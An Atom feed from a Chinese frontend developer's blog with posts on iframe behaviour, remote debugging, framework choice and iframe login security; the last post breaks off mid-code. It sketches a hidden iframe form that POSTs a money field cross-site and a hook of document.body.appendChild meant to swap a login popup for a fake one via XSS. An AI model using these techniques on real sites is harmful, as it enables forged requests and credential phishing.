<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Eva&#39;s Blog</title>
  
  <subtitle>进一寸有一寸的欢喜</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://evacoder.com/"/>
  <updated>2019-02-22T06:52:57.427Z</updated>
  <id>https://evacoder.com/</id>
  
  <author>
    <name>Eva</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>「 HTML 」iframe100问</title>
    <link href="https://evacoder.com/2019/02/18/iframe/"/>
    <id>https://evacoder.com/2019/02/18/iframe/</id>
    <published>2019-02-18T14:51:35.000Z</published>
    <updated>2019-02-22T06:52:57.427Z</updated>
    
    <content type="html"><![CDATA[<p>上篇说到iframe弹窗的登录安全，接下来我们带着问题出发，详细的了解下iframe这个历史的产物。</p><p>虽然足够古老，但是也能解决很多现代的问题。<br><a id="more"></a></p><h4 id="Frame-间的关系"><a href="#Frame-间的关系" class="headerlink" title="Frame 间的关系"></a>Frame 间的关系</h4><p>在页面中，window.top是最顶层的window，window和self都是当前window，window.parent是外层父window。</p><p>对于不存在 iframe 的页面，self，window，parent，top 这四者都相等，还有一个这 iframe中最常用的属性，frames</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span> === <span class="built_in">window</span>.frames <span class="comment">// 很奇怪的是这个一直都是true，在有子iframe的页面也是</span></span><br></pre></td></tr></table></figure><p>在有子 iframe 的页面中，这个<code>window.frames</code>就是本页面中包含的直接子frame的类数组，这个属性连接了frame 的parent，child，siblings，但是这个类数组中的元素不是直接的iframe dom，而是iframe的contentWindow，相当于是iframe环境下的window对象。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span> === <span class="built_in">window</span>.frames <span class="comment">// 一直都是true，所以在有子iframe的页面，window居然也是类array</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.getElementsByTagName(<span class="string">'iframe'</span>)[<span class="number">0</span>].contentWindow === <span class="built_in">window</span>.frames[<span class="number">0</span>]; <span class="comment">// true</span></span><br></pre></td></tr></table></figure><h4 id="父frame操作子frame"><a href="#父frame操作子frame" class="headerlink" title="父frame操作子frame"></a>父frame操作子frame</h4><p>主要通过window.frames来操作，有时候获取到子 frame 的属性为 undefined，那是因为子frame加载需要时间，要注意等子frame加载完成之后再获取。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fr1Window = <span class="built_in">window</span>.frames[<span class="number">0</span>]; <span class="comment">// 或者document.getElementsByTagName("iframe")[0].contentWindow;</span></span><br><span class="line"><span class="comment">// 操作dom</span></span><br><span class="line">fr1Window .document.getElementsByTagName(<span class="string">"body"</span>)[<span class="number">0</span>].style.backgroundColor = <span class="string">"#ff6700"</span>;</span><br><span class="line"><span class="comment">// 操作变量</span></span><br><span class="line">fr1Window.arr1=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line">fr1Window.arr1.push(<span class="string">'Eva'</span>);</span><br><span class="line"><span class="comment">// 操作src</span></span><br><span class="line"><span class="built_in">document</span>.getElementsByTagName(<span class="string">"iframe"</span>)[<span class="number">0</span>].src=<span class="string">'https://evacoder.com'</span>;</span><br></pre></td></tr></table></figure><h4 id="子frame操作父frame"><a href="#子frame操作父frame" class="headerlink" title="子frame操作父frame"></a>子frame操作父frame</h4><p>主要通过window.parent来操作</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> parentWindow = <span class="built_in">window</span>.parent;<span class="comment">// window.top 是在多层级的页面中最顶层window</span></span><br><span class="line"><span class="comment">// 操作dom</span></span><br><span class="line">parentWindow .document.getElementsByTagName(<span class="string">"body"</span>)[<span class="number">0</span>].style.backgroundColor = <span class="string">"#ff6700"</span>;</span><br><span class="line"><span class="comment">// 操作变量</span></span><br><span class="line">parentWindow.arr1=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line">parentWindow.arr1.push(<span class="string">'Eva'</span>);</span><br><span class="line"><span class="comment">// 也能直接操作父frame的location，所以一定要注意iframe安全</span></span><br><span class="line">parentWindow.location.href =<span class="string">'https://evacoder.com'</span>;</span><br></pre></td></tr></table></figure><h4 id="子frame操作相邻-frame"><a href="#子frame操作相邻-frame" class="headerlink" title="子frame操作相邻 frame"></a>子frame操作相邻 frame</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> siblingWindow = <span class="built_in">window</span>.parent.frames[<span class="number">1</span>];</span><br><span class="line">siblingWindow.document.body.style.backgroundColor = <span class="string">'#ff5700'</span>;</span><br><span class="line">siblingWindow.arr1 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line">siblingWindow.arr1.push(<span class="string">'Eva'</span>);</span><br><span class="line"><span class="comment">// 也能直接操作siblings frame的location，所以一定要注意iframe安全</span></span><br><span class="line">siblingWindow.location.href =<span class="string">'https://evacoder.com'</span>;</span><br></pre></td></tr></table></figure><p>如此看来也没什么特别的，互相都可以操作，但是加上跨域就有所限制了。</p><h4 id="iframe-FAQ"><a href="#iframe-FAQ" class="headerlink" title="iframe FAQ"></a>iframe FAQ</h4><p>1<strong>.跨域情况下父子frame可以修改互相操作dom么？</strong></p><p>不行，为了安全，父子frame之间都不可互相操作dom，遵循同源策略。</p><p>但是如果一定要实现父子通信的功能，就需要另开一篇来说iframe跨域的解决方案了，主要使用 post message，先不展开细说。</p><p>2<strong>.跨域情况下子frame可以修改父window的location吗？如何禁止？</strong></p><p>可以，虽然跨域情况下不能dom操作，读取<code>parent.location.href</code>都做不到，但神奇的是却可以直接设置parent.location.href，修改父window的location。</p><p>在新版chrome会提示需要有用户交互的时候才能触发跳转，只要加上按钮引导用户点击还是可以实现跳转。</p><p>总之不是自己管理的页面都不是可信的，为了防止我们内嵌的子页面被坏人篡改或有其他漏洞，我们最好要防止内嵌的iframe修改我们的页面。</p><p>可以通过HTML5的新特性<code>sandbox</code>属性来限制iframe的行为，这个属性是反向的，如果空字符串则会应用所有的限制，sandbox包含的属性会移除对应的限制。</p><table><thead><tr><th style="text-align:left">“”</th><th style="text-align:left">应用以下所有的限制。</th></tr></thead><tbody><tr><td style="text-align:left">allow-same-origin</td><td style="text-align:left">允许 iframe 内容被视为与包含文档有相同的来源。</td></tr><tr><td style="text-align:left">allow-top-navigation</td><td style="text-align:left">允许 iframe 内容从包含文档导航（加载）内容。</td></tr><tr><td style="text-align:left">allow-forms</td><td style="text-align:left">允许表单提交。</td></tr><tr><td style="text-align:left">allow-scripts</td><td style="text-align:left">允许脚本执行。</td></tr></tbody></table><p>如果不开放allow-scripts权限，iframe中的任何js都执行不了，那会造成功能失效，不是我们的初衷。</p><p>其他权限可以按需打开，只要不加上allow-top-navigation，内嵌iframe就无法操作我们的页面</p><p>所以我们需要在引入iframe处添加</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=<span class="string">"iframe.html"</span> sandbox=<span class="string">"allow-scripts allow-forms"</span>&gt;</span><br></pre></td></tr></table></figure><p>内嵌的iframe就无权限修改我们页面的地址了，如果加上了<code>sandbox=&quot;allow-top-navigation&quot;</code>则会恢复权限。</p><p>但是在实际中大部分 iframe 都没有设置 sandbox 属性。</p><p><code>allow-same-origin</code>一看就很有意思，我们将在后文中提到。</p><p>插播一个，这种父子 frame 的关系和 window.open()打开的页面也有相似之处，有一个注意点是如果使用<code>target=&#39;_blank&#39;</code>打开别人的网站，一定要注意别人同样可以通过<code>window.opener</code>来控制你的网站</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.opener.location=<span class="string">'https://evacoder.com'</span>;</span><br></pre></td></tr></table></figure><p>一般人都不会想到后打开的页面居然可以控制原始页面</p><p>为了限制<code>target=&#39;_blank&#39;</code>打开的页面通过<code>window.opener</code>控制父页面，可以加上以下代码，阻止被打开的页面控制原页面。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">target</span>=<span class="string">'_blank'</span> <span class="attr">rel</span>=<span class="string">'noreferrer noopener'</span> <span class="attr">href</span>=<span class="string">'https://www.otherpage.com'</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">// noreferrer 针对firefox，noopener 针对其他</span><br></pre></td></tr></table></figure><p>3<strong>.如何防止自己的页面被嵌在iframe中？</strong></p><p>在上一篇文章中，我们提到了为了安全禁止了登录页被嵌在iframe中，但是一般更多的是为了预防点击劫持（clickjacking）的考虑。</p><p>如果我们有个广告页，需要靠点击量来计费，坏人把我们的页面放在一个透明度为0的iframe中，用户就可能无感知的情况下点击，广告费就猛增。</p><p>以前的做法一般是通过js在页面中加入</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (top !== self) &#123;</span><br><span class="line">top.location = location</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就可以保证自己始终是在顶层窗口中显示，就避免了被内嵌在别人的页面中。</p><p>但是现在一般都通过服务端直接设置<code>X-Frame-Options：SAMEORIGIN</code>响应头来只允许被同域的页面内嵌。</p><p><strong>4.post请求可以跨域么？</strong></p><p>我们常说的浏览器有跨域请求限制，实际上是 ajax 不能跨域，但我们可以用 古老的form 表单来跨域呀，在 iframe 中提交，还可以做到form表单提交而且页面不刷新</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe style=<span class="string">"display:none"</span>&gt;</span><br><span class="line">　&lt;form method=<span class="string">"POST"</span>　action=<span class="string">"http://api.mi.com"</span>&gt;</span><br><span class="line">　　　　&lt;input type=<span class="string">"hidden"</span> name=<span class="string">"other"</span> value=<span class="string">"XXX"</span>&gt;</span><br><span class="line">　　　　&lt;input type=<span class="string">"hidden"</span> name=<span class="string">"money"</span> value=<span class="string">"10000"</span>&gt;</span><br><span class="line">　&lt;<span class="regexp">/form&gt;</span></span><br><span class="line"><span class="regexp">&lt;/i</span>frame&gt;</span><br></pre></td></tr></table></figure><p><strong>5.可以在iframe的引用页修改iframe元素的样式吗？</strong></p><p>比如我用了google reCAPTCHA的sdk，出来的验证码是通过iframe加载的，我想要修改google的样式。</p><p>如上文所述，跨域了是不能进行 DOM 操作的，不然会有严重的安全问题，post message 也只是能在页面间传递信息而已。</p><p><strong>6.iframe 影响了类型判断</strong></p><p>在使用 iframe 时，每个frame 定义的全局变量会自动成为该 frame 中window的全局属性，而每个window对象都包含原生类型的构造函数，window对象都不相等，window.Array 和 window.frames[0].Array当然是不等的，所以会出现古怪的bug。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> el = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(el);</span><br><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="built_in">console</span>.log(arr <span class="keyword">instanceof</span> <span class="built_in">Array</span>); <span class="comment">// true</span></span><br><span class="line"><span class="built_in">console</span>.log(arr <span class="keyword">instanceof</span> <span class="built_in">window</span>.frames[<span class="number">0</span>].Array); <span class="comment">// false</span></span><br></pre></td></tr></table></figure><p>虽然我们一般不会如上面的例子那样去判断arr是不是别的frame下的Array，常用的场景是在iframe中获取parent frame的某个arr来进行类型判断，这样通过 instanceof 来判断对象的class就会出现出人意料的bug。</p><p>所以建议使用<code>Array.isArray(arr)</code>或者<code>toString.call(arr)===&#39;[object Array]&#39;</code>来判断类型。</p><p><strong>7.iframe的使用场景</strong></p><p>iframe 早已成为浏览器的规范实现，所以兼容性其实还可以，可以放心使用。</p><p>早年 iframe 经常被用在后台管理系统中的 navbar和 siderbar 的实现，主要是为了复用，现在早就不建议这么做了。</p><p>iframe 最大的好处是它一个独立的运行环境，邮箱框架中使用的比较多。</p><p>我接触到的有用在无刷新文件上传和登录页定制化（背景图开放给第三方上传管理）。</p><p><strong>8.<code>target=&quot;_blank&quot;</code></strong><br>今天突然发现引入的google reCAPTCHA iframe里的a链接：“常见问题”点完的效果是直接打开一个tab，原来<strong>iframe不仅能修改父frame的location，还可以打开一个新的tab</strong>，同样是如2中所述，加上sandbox属性可以禁止。</p><p>具体可以参考 <a href="https://www.zhihu.com/question/20653055" target="_blank" rel="noopener">知乎：iframe 的好处和坏处</a> 可以了解些历史故事，但是如果有其他替代方案最好还是不要使用 iframe。</p><p>参考</p><p><a href="https://www.zhihu.com/question/20653055" target="_blank" rel="noopener">知乎：iframe 的好处和坏处</a><br><a href="https://zhuanlan.zhihu.com/p/38538801" target="_blank" rel="noopener">Chrome 将默认屏蔽“非用户行为触发”的父页面跳转</a></p><p>想到其它有意思的点再补充吧~</p><p>今天真的很忙，一整天被呼来唤去的，想起每日一更的约定又难实现，真的要嘤嘤嘤的哭出来，压力大的每天晚上都睡不好，其实也没人逼我，就想试试自己能坚持多久。</p><p>可能要求数量的话会导致质量降低，但是有这样的约定挂在心头总比每日毫无追求来的好。</p><p>坚持一万小时训练法，等我变成三十岁的老阿姨，一定会有很大的变化。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;上篇说到iframe弹窗的登录安全，接下来我们带着问题出发，详细的了解下iframe这个历史的产物。&lt;/p&gt;
&lt;p&gt;虽然足够古老，但是也能解决很多现代的问题。&lt;br&gt;
    
    </summary>
    
    
      <category term="HTML" scheme="https://evacoder.com/tags/HTML/"/>
    
  </entry>
  
  <entry>
    <title>「 工具 」前端远程调试及空白或404解决</title>
    <link href="https://evacoder.com/2019/02/17/remote_debugging/"/>
    <id>https://evacoder.com/2019/02/17/remote_debugging/</id>
    <published>2019-02-17T12:11:15.000Z</published>
    <updated>2019-03-13T10:39:04.161Z</updated>
    
    <content type="html"><![CDATA[<p>因为自己的开发环境搭建的太舒适，在别人的电脑上查问题感觉完全无法展现自己的能力。</p><p>再加上已经习惯了chrome dev tool的每一种功能，一换到safari上查兼容性问题，都感觉自己变成了白痴。</p><p>更不要说去测试webview里的问题，console都没法看，真的要一行一行alert吗？</p><p>啥？你居然不会remote debugging！</p><p>那你怎么证明到底是你还是native 开发的锅？啥证据都没有。</p><p>虽然模拟器也能完成调试的功能，但是不能完全依赖模拟的结果，而且有些特定的机型并没有模拟器，有时候必须要在真机上复现问题，最重要的是模拟器没有chrome devtools呀。</p><a id="more"></a><h4 id="Andriod"><a href="#Andriod" class="headerlink" title="Andriod"></a>Andriod</h4><p>其实这个配置非常简单，用起来也方便，小伙伴们主要遇到的就是打开页面空白或者404的问题。</p><p>所以最重要的是要检查下PC能否科学地 <strong>网上冲浪</strong></p><p>有时候能访问google都不一定成功，需要试下这个地址</p><p><a href="https://chrome-devtools-frontend.appspot.com/" target="_blank" rel="noopener">https://chrome-devtools-frontend.appspot.com/</a></p><p>如果不行的话，配置以下host</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">172.217.161.180 chrome-devtools-frontend.appspot.com</span><br><span class="line">172.217.161.180 chrometophone.appspot.com</span><br></pre></td></tr></table></figure><p>现在访问基本上是秒开啦。</p><p>访问：<code>chrome://inspect/#devices</code></p><p>然后就可以方便的调试了。</p><p>1.在开发者模式下允许通过usb来调试</p><p>2.重新连接下usb</p><p><img src="/images/remote_debugging1.png" alt=""></p><p>出现上图，点击inspect就可以开始调试啦。</p><p>不必安装chrome浏览器，其他的浏览器和webview都可以进行调试。</p><p>如果webview测试不了，还需要安卓端配置下允许调试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WebView.setWebContentsDebuggingEnabled(<span class="keyword">true</span>);</span><br></pre></td></tr></table></figure><h4 id="iOS"><a href="#iOS" class="headerlink" title="iOS"></a>iOS</h4><p>iOS的remote debugging比较难，难在首先你需要一台mac哈哈哈，但是mac却可以直接调试Andriod。</p><p>1.iPhone上设置-&gt;Safari-&gt; 高级-&gt; Web 检查器，打开</p><p>2.mac 上 safara-&gt;偏好设置-&gt;高级-&gt;在菜单栏显示“开发”菜单</p><p>3.usb连接两者</p><p>4.打开 mac safari，顶部菜单中的开发，选择设备点开即可<br><img src="/images/remote_debugging2.png" alt=""></p><p>也是可以调试webview，safari</p><p>掌握了远程调试的技能，基本可以解决大部分移动端相关的问题了。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;因为自己的开发环境搭建的太舒适，在别人的电脑上查问题感觉完全无法展现自己的能力。&lt;/p&gt;
&lt;p&gt;再加上已经习惯了chrome dev tool的每一种功能，一换到safari上查兼容性问题，都感觉自己变成了白痴。&lt;/p&gt;
&lt;p&gt;更不要说去测试webview里的问题，console都没法看，真的要一行一行alert吗？&lt;/p&gt;
&lt;p&gt;啥？你居然不会remote debugging！&lt;/p&gt;
&lt;p&gt;那你怎么证明到底是你还是native 开发的锅？啥证据都没有。&lt;/p&gt;
&lt;p&gt;虽然模拟器也能完成调试的功能，但是不能完全依赖模拟的结果，而且有些特定的机型并没有模拟器，有时候必须要在真机上复现问题，最重要的是模拟器没有chrome devtools呀。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Tool" scheme="https://evacoder.com/tags/Tool/"/>
    
  </entry>
  
  <entry>
    <title>「 前端团队建设 」 技术选型之路</title>
    <link href="https://evacoder.com/2019/02/16/frameworks_selection/"/>
    <id>https://evacoder.com/2019/02/16/frameworks_selection/</id>
    <published>2019-02-16T14:46:53.000Z</published>
    <updated>2019-03-13T10:39:49.097Z</updated>
    
    <content type="html"><![CDATA[<p>这篇文章是个吐槽文，小伙伴们看着玩儿吧，更希望你们能跟我分享你的观点。</p><h4 id="引子"><a href="#引子" class="headerlink" title="引子"></a>引子</h4><p>之前有个四年换了五份工作的技术leader，过来给我们技术分享，实际也没讲什么技术，因为主要是内部后台管理系统，主要分享了下团队管理。</p><p>他说我的团队成员很幸福，我们不用antd，不好用，我自研了ui框架，小弟们只需要搭积木一样搭起来就可以了。我招的人都学会了这个框架，每次我换工作都带着他们一起换。</p><a id="more"></a><p>因为是自研框架，自己很清楚哪里有问题，很easy就改了。</p><p>之前上一个前端团队说，这个实现不了，那个也实现不了，我们每次都能保质保量的完成，让大家都很满意。</p><p>老板问我工期，我说四周，老板说四周能行吗？给你六周吧。（下面的人说，你们老大一定不懂前端哈哈哈）</p><p>实际上我们一周就完成了，剩下的时间想干啥就干啥，这就是自己造的轮子的好处。</p><p>（时间比较久了，可能记得没那么清楚了，如果这位兄弟出来辟谣，请以他说的为准）</p><p>那我们就假设有这么个人吧，反正肯定有这样的人。</p><p>听完真的很刷新我的三观，可能这就是这位兄弟的目的，总是这么语出惊人。虽然带了调侃的语气，但是还是有些不能接受。</p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>一可能是我也工作快三年了，还觉得自己是个小白，有好多知识需要学习，总是带着谦卑的心去跟任何人学习，依然是一线码农（倒也并不是排斥这个身份），身边的同事们也都是这样啊，没什么好狂的，可能是有些羡慕？</p><p>二是真心觉得这样和包工头带着工程队有啥区别呢？看看这个leader四年换五份工作，轻轻松松走上人生巅峰，那自研框架的文档完善吗？代码质量值得信赖吗？测试都跑通了吗？你觉得你的框架写的好，又没有开源接受大家的检验。接手者为了扩展新需求还要去学习你写的代码，而且更惨的是他们写了好多系统，如果是不同的人来维护接手，都需要来搞懂他们的代码。</p><p>三是这对他的小弟和未来的接手者都不是好事，搞懂他的代码有啥用呢？有这时间还不如去研究vue，react的源码。小弟们天天搭积木有啥进步呢？换下一家公司之后之前的工作经验都化为灰烬，你再知道那个自研框架哪里有坑都等于0，还不如和别的前端小伙伴津津乐道下当前最流行的框架有什么坑呢！如果小弟们带着这个自研框架去别的公司那就更可怕了，又去祸害别人？</p><p>四是虽然之前觉得狗东的二五原则有点扯，但是有些东西你不深入dive in 进去研究几年，总是浮在最表层，只是自己的简历上增加几个无意义的项目而已。超哥老是吐槽我，你怎么还在写登录页啊，我只能说嗯，我以后就有十年写登录页的经验了，花式写登录页。</p><p>跟着这样的老大可能工作很愉快，天天有段子听，有时间学习，但是并不是每个人都能保持学习的，有时候很多人的学习也就是只在工作中学习，而且他说招的都是应届生，这对应届生的发展更是非常不利。</p><p>反正我们真的应该警惕这样的老大。</p><h4 id="期望"><a href="#期望" class="headerlink" title="期望"></a>期望</h4><p>我的第一份工作虽然不是什么大厂，但是很庆幸一开始就遇到拎得清的老大，实名感谢。他虽然是个后端架构师，但是一开始就主张不要使用内部框架而是领先使用Angular，有什么坑他来扛。</p><p>虽然他也跟我说这有点面向简历编程，但是这对你们来说是好事，虽然大部分人的工作其实都是搬砖，内部框架你玩得再6，一换工作，你所有的积累都化为0，如果一直使用的是有影响力的开源框架，至少下一份工作你能说你最起码用过某个主流框架。</p><p>最开始就听leader说赶进度三个人一天写了三百个页面还觉得很震惊。其实即使不使用任何框架，大牛们写好基础组件，搭积木一样，天天ctrl +C+V，完全是正常的。</p><p>超哥也跟我说，一般人工作到一定的阶段都会感觉到没开始那么难，因为你对代码越来越熟悉，你知道哪里有坑，不可能一直都是搬砖状态。想想也是，上文中如果直接使用antd，只不过需要写些扩展组件，小弟们后来也一样能六周变一周，有时间读源码，再安排些真正的技术分享，简直是一个应届生最大的幸运。</p><p>小伙伴吐槽来了个领导是阿里的，之前用weex，所以现在他们也开始招weex开发，好歹weex也是开源的，（他说其实阿里自己都快不用weex了？不了解，待考）。技术选型用啥其实我们作为小白的时候也做不了主，但是可以用来做找工作的重要考核，而且希望看到这篇文章的你们以后当了leader之后在技术选型上也能慎重。</p><p>再就是我虽然建议选主流框架，但并不是说原生js的实践能力不重要，作为一个前端，<strong>这是最最重要的基本功。</strong></p><p>只是有的时候你会发现自己写的框架自己看了都恶心，最重要的是还特别大，实际上你清醒一点，vue只有39kb，jquery只有36kb，比你自己写的东一榔头西一锤子要好。当然啦，你可以写着玩儿，但是公司雇你来不是让你玩儿的哈哈哈。为了提高技术我们真的应该自己研究下框架是咋实现的，但是要对自己的实现负责，不要强迫别人来研究你写的框架，使用了框架自己整理util，mixin还是必不可少的。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>有人说，你们前端的kpi就是隔几年就换个框架全部重构一遍来完成的，哟呵，这都被你发现了。</p><p>其实也不是我们的问题，只是JS不像其他语言那样有自己的核心库，需要依赖一些外部框架，二是前端发展确实太快了，总有新框架新方案解决新问题，但是每年重构换框架，哪有那么容易。</p><p>为了不被别人鄙视，真的应该好好读读源码。</p><p>今天吐槽先到这里吧，最后的结论是啥呢。</p><p>老是有小伙伴说没有机会去实践主流框架，内部管理系统是干啥的？</p><p>总之记住一条原则：<strong>不要拿外部有影响力的项目来练手，在内部系统中使用新技术做一些有趣的尝试，积累经验踩过坑之后再用在外部系统中。</strong></p><p>每日写文吐槽：</p><p>吐槽文写的就是畅快，很easy就写完了。其实很喜欢现在的工作状态，有时间全面了解知识并实践，和刚开始写不出来文章相比，已经积累了很多选题，就是需要时间完善整理。</p><p>我知道我的排版丑，如果有思维导图就更好，也知道哪里去找好看不侵权的图，用什么工具来画图，作为一个前端还想做自己的主题（答应超哥2年了也没写），还准备要咨询专业写公众号的毛毛来学习排版。</p><p>先弱弱地找个借口，现在还没走上正轨，但我一向是一个守诺的人，周末了，能有个时间来缓冲，希望大家监督</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这篇文章是个吐槽文，小伙伴们看着玩儿吧，更希望你们能跟我分享你的观点。&lt;/p&gt;
&lt;h4 id=&quot;引子&quot;&gt;&lt;a href=&quot;#引子&quot; class=&quot;headerlink&quot; title=&quot;引子&quot;&gt;&lt;/a&gt;引子&lt;/h4&gt;&lt;p&gt;之前有个四年换了五份工作的技术leader，过来给我们技术分享，实际也没讲什么技术，因为主要是内部后台管理系统，主要分享了下团队管理。&lt;/p&gt;
&lt;p&gt;他说我的团队成员很幸福，我们不用antd，不好用，我自研了ui框架，小弟们只需要搭积木一样搭起来就可以了。我招的人都学会了这个框架，每次我换工作都带着他们一起换。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Team" scheme="https://evacoder.com/tags/Team/"/>
    
  </entry>
  
  <entry>
    <title>「 安全 」从iframe说到万物皆可hook</title>
    <link href="https://evacoder.com/2019/02/15/iframe_security/"/>
    <id>https://evacoder.com/2019/02/15/iframe_security/</id>
    <published>2019-02-15T09:06:31.000Z</published>
    <updated>2019-02-18T08:53:30.695Z</updated>
    
    <content type="html"><![CDATA[<h4 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h4><p>今天遇到有业务要求我们的登录页允许被嵌在 iframe 中以满足导流需求，找安全的大佬们讨论了下，最后给出的结论是：</p><blockquote><p>如果业务方的代码写的挫了点，有 xss 漏洞的话，坏人完全可以把你本来的 iframe 隐藏掉，自己写个弹框出来，这样的话用户完全无感知地被篡改了，直接输入用户名和密码，信息就被上送到了坏人的服务器。</p></blockquote><p>what？还能这样吗？ 那得写多少代码才能覆盖掉弹窗再伪造一个出来啊！</p><p>作为一个小白我算是长见识了。但是经过尝试，其实并不是那么回事。<br><a id="more"></a></p><h4 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h4><p>但是作为一个与用户交互最紧密的前端，登录页总是302跳转到新的页面对于用户来说其实是非常不友好的，打断了用户操作，跳过去跳过来的都晕了，如果能够弹窗登录，那抢手机的路上将一气呵成，非常愉快呀！<br>弹窗登录一般都是 iframe 实现的，因为大家一般都是 sso 登录，也就是说要做出一个通用的框架，所以一般使用 iframe。</p><p>我弱弱的说了句，嗯，百度好像也是 iframe 呀，其他也有很多厂商是 iframe 的，这样的问题并不是很严重吧。<br>没想到大佬们立刻就开始研究百度的弹窗。结论是：<br>做的很巧妙啊！点击之后才出弹窗，xss 一般都是一开始就进行篡改，但是这种方式的话，坏人没办法获取用户点击【登录】的时机，这样应该没那么容易篡改。</p><h4 id="万物皆可hook"><a href="#万物皆可hook" class="headerlink" title="万物皆可hook"></a>万物皆可hook</h4><p>听得有点懵，后来才明白，他们就是想hook用户点击登录的click事件。</p><p>哈哈，术业有专攻。终于轮到我们前端大展身手的时候了，他们是不知道我们的【万物皆可hook】定理。</p><p>千千音乐盒为例：<br><img src="/images/qian1.png" alt=""></p><p>点击登录之后，弹出了iframe，这时候一般都会有服务器交互，我们先看看chrome devtool的network，但是出现了好多条请求。这时候我们右键单击审查元素，看看iframe的src，其实凭经验来说，这种弹窗一般都是调用document.body.appendChild来添加在页面中，但是有更好的方法来佐证。</p><p><img src="/images/qian3.png" alt=""><br>重要小tips：network中的Initiator会展示出发出请求的具体代码行数，点击一下就可以定位到具体是哪一行发出了这个请求。代码一般都压缩了的，点击下面的{}就可以格式化代码。果不其然，就是调用了appendChild，再看下html结构，显然是在append在body中的。</p><p>感兴趣的可以查看chrome devTool的使用（TODO）。</p><p>既然锁定了调用的是document.body.appendChild，那我们就可以放心的hook啦！<br>核心代码很简单，就是使用了js的call方法。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> append = <span class="built_in">document</span>.body.appendChild;</span><br><span class="line"><span class="built_in">document</span>.body.appendChild = <span class="function"><span class="keyword">function</span>(<span class="params">el</span>) </span>&#123;</span><br><span class="line">  alert(<span class="string">'hook success'</span>);</span><br><span class="line">  append.call(<span class="built_in">document</span>.body, el);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们成功的hook了document.body.appendChild方法，在执行原来操作方式之前执行了我们的alert。</p><p>大佬要求我完整的实现隐藏原来的弹窗，弹出自己实现的弹窗。</p><p>那代码量应该不少吧。我们xss只能插入js，插入不了css，即使实现了也应该很丑吧。</p><p>no，no，no。</p><p>js啥都能插入!</p><p>html</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const fakeIframe = document.createElement(&apos;div&apos;);</span><br></pre></td></tr></table></figure><p>css</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fakeIframe.style= &apos;border:1px solid #f8f8f8&apos;;</span><br></pre></td></tr></table></figure><p>就是需要写好多dom操作的代码。</p><p>or 直接<br><figure 